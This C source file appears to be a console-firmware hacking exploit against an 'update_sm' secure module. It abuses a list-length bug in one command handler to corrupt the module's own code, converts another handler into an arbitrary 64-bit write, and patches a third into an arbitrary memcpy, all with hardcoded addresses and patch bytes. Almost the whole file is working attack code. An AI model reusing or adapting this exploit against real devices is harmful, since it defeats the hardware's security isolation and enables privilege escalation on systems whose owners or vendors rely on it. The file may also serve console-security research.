#include "../source/include/types.h"

#include "../source/include/defs.h"
#include "../source/include/uart.h"
#include "../source/include/debug.h"
#include "../source/include/utils.h"
#include "../source/include/clib.h"

typedef struct {
    uint32_t* addr;
    uint32_t length;
} __attribute__((packed)) ussm_region_t;

typedef struct {
    uint32_t unused_0[2];
    uint32_t use_lv2_mode_0;
    uint32_t use_lv2_mode_1;
    uint32_t unused_10[3];
    uint32_t list_count; // must be < 0x1F1
    uint32_t unused_20[4];
    uint32_t total_count; // only used in LV1 mode
    uint32_t unused_34[1];
    ussm_region_t list[0x1f1]; // lv1 or lv2 list
} __attribute__((packed)) ussm_cmd_0x50002_t;

int ussm_corrupt(uint32_t offset) {
    void* args_area = (void*)0x1f850000;
    memset(args_area, 0, 0x2000);
    ussm_cmd_0x50002_t* args = args_area + 0x40;
    args->list_count = 3;
    args->total_count = 1;
    args->list[0].addr = 0x5c000;
    args->list[0].length = 0x20;
    args->list[1].addr = 0x5c000;
    args->list[1].length = 0x20;
    args->list[2].addr = 0;
    args->list[2].length = offset - 0x14;
    
    void (*ussm_0x50002)(void* u_args) = (void*)0x0004b76e;
    ussm_0x50002(args_area);

    return *(uint32_t*)(args_area + 8);
}

/*
 convert ussm_0x20002 to arb write64:
  - corrupt: 0x0004b468 - 0x0004b47c
  - corrupt: 0x0004d55c - 0x0004d64c
  - corrupt: 0x0004d65c - 0x0004d6e0
  - corrupt: 0x00051c68 - 0x00051c94 (optional - print)
 write64 with conv 0x20002:
  - *(arg+0x90) must be !0
  - *(arg+0x94) must be !0
  - *arg is the target
  - *(arg+0x30) is the data64
*/
int write_arb64(uint32_t dst, uint32_t u0, uint32_t u1) {
    void* args_area = (void*)0x1f850000;
    memset(args_area, 0, 0x2000);
    uint32_t* argv = args_area + 0x40;
    
    argv[0] = dst;
    argv[0xC] = u0;
    argv[0xD] = u1;
    argv[0x24] = -1;
    argv[0x25] = -1;

    void (*ussm_0x20002)(void* u_args) = (void*)0x0004b456;
    ussm_0x20002(args_area);

    return *(uint32_t*)(args_area + 8);
}

/*
 convert ussm_0x90002 to arb memcpy:
  - write64(0x0004b9f4, 0x0040c16e, 0x0044c26e)
  - write64(0x0004b9fc, 0x0048c36e, 0x0077d8d9)
  - write64(0x0004ba04, 0x0008c06a, 0x04bada98)
 mepcpy with conv 0x90002:
  - *arg is dst
  - *(arg+0x4) is src
  - *(arg+0x8) is sz
*/
int mepcpy(uint32_t dst, uint32_t src, uint32_t sz) {
    void* args_area = (void*)0x1f850000;
    memset(args_area, 0, 0x2000);
    uint32_t* argv = args_area + 0x40;

    argv[0] = dst;
    argv[1] = src;
    argv[2] = sz;

    void (*ussm_0x90002)(void* u_args) = (void*)0x0004b9d6;
    ussm_0x90002(args_area);

    return *(uint32_t*)(args_area + 8);
}

// test update_sm exploit for 0.995 IPM elf loaded @ 0x4a000
__attribute__((section(".text.rpcp")))
int rpcp(uint32_t arg0, uint32_t arg1, void* extra_data) {
    printf("\n[RPCP] hello world (%X, %X, %X)\n", arg0, arg1, (uint32_t)extra_data);

    int (*ussm_init_heap)(uint32_t addr, uint32_t size) = (void*)0x52ad0;
    int ret = ussm_init_heap(0x56000, 0x4000);
    printf("[RPCP] ussm_init_heap ret %X\n", ret);

    printf("[RPCP] converting ussm 0x20002\n");
    for (uint32_t off = 0x0004b468; off < 0x0004b47c; off -= -4)
        ussm_corrupt(off);
    for (uint32_t off = 0x0004d55c; off < 0x0004d64c; off -= -4)
        ussm_corrupt(off);
    for (uint32_t off = 0x0004d65c; off < 0x0004d6e0; off -= -4)
        ussm_corrupt(off);
    for (uint32_t off = 0x00051c68; off < 0x00051c94; off -= -4)
        ussm_corrupt(off);
    printf("[RPCP] ussm 0x20002 converted\n");

    printf("[RPCP] converting ussm 0x90002\n");
    write_arb64(0x0004b9f4, 0x0040c16e, 0x0044c26e);
    write_arb64(0x0004b9fc, 0x0048c36e, 0x0077d8d9);
    write_arb64(0x0004ba04, 0x0008c06a, 0x04bada98);
    printf("[RPCP] ussm 0x90002 converted\n");

    printf("[RPCP] calling mepcpy(%X, %X, 0x20)\n", arg0, arg1);
    ret = mepcpy(arg0, arg1, 0x20);
    printf("[RPCP] mepcpy ret %X\n", ret);

    print("[RPCP] bye\n\n");
    return ret;
}
